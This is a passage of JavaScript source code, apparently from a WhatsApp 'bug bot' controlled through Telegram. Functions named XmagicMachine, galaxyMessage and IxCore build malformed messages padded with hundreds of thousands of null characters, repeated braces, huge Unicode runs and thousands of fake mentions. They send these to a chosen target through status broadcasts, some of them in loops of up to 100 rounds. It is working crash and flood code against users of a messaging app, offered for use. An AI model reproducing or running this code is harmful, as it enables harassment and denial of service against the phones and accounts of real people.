            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, interMsg, msgxay]
 
  
    let content = {
        extendedTextMessage: {
          text: "⋆｡°✩ ⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆✩°｡⋆" + "軎�".repeat(50000),
          matchedText: "軎�".repeat(20000),
          description: "⋆｡°✩ ⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆✩°｡⋆",
          title: "軎�".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "K4ezarIX@newsletter",
                newsletterName:
                  "⋆｡°✩ ⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆✩°｡⋆" + "軎�".repeat(10000),
                caption:
                  "⋆｡°✩ ⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆✩°｡⋆" +
                  "軎�".repeat(60000) +
                  "釤勧煗".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "⋆｡°✩ ⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆✩°｡⋆" + "鈨濌櫚隀瓣櫚".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      };
      
    const xnxxmsg = generateWAMessageFromContent(target, content, {});

  
  let msg = null;
  for (let i = 0; i < 100; i++) {
  await sock.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
  
    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
   
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

//



//

async function XmagicMachine(target) {

  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{
  "values": {
    "in_pin_code": "777777",
    "building_name": "4u",
    "landmark_area": "gotham",
    "address": "Medan",
    "tower_number": "0",
    "city": "Medan",
    "name": "Azizie Adnan",
    "phone_number": "62999888777",
    "house_number": "0",
    "floor_number": "19",
    "state": "${"\u0000".repeat(900000)}"
  }
}`,
          version: 3
        }
      }
    },
    { userJid: target }
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target, "0@s.whatsapp.net"],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function galaxyMessage(sock, target) {
  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Hallo"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson:
                    `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0}` 
                    + "\u0000".repeat(100000)
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 3000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true },
          },
        ],
      }
    );
  }

  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    cta
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id }
  );
  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg2.message
      }
    },
    cta
      ? { messageId: msg2.key.id, participant: { jid: target } }
      : { messageId: msg2.key.id }
  );

  console.log(chalk.red(`[ATLANTIC] Proses Standing Bug SlowHit To  ${target}`));
}

async function IxCore(target) {
  for (let i = 0; i < 17; i++) {
    const msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
    
    await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target]
  });

  const mention = true;
  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: { is_status_mention: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆" },
        content: undefined
        }]
      });
    }
  }
}

//------------(END FUNCTION CASE)-------------\\\

// --- Error Handler ---
function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  bot.sendMessage(OWNER_ID, errorText, {
    parse_mode: "Markdown"
  }).catch(e => console.log("Failed to send error to owner:", e));
}

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  r(err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason);
  r(reason);
});

// --- Set Bot Profile Sekali Saat Bot Start ---
(async () => {
  try {
    await setBotProfile(bot);
    console.log("✅ Bot profile set successfully!");
  } catch (e) {
    console.error("Failed to set bot profile:", e);
    r(e);
  }
})();
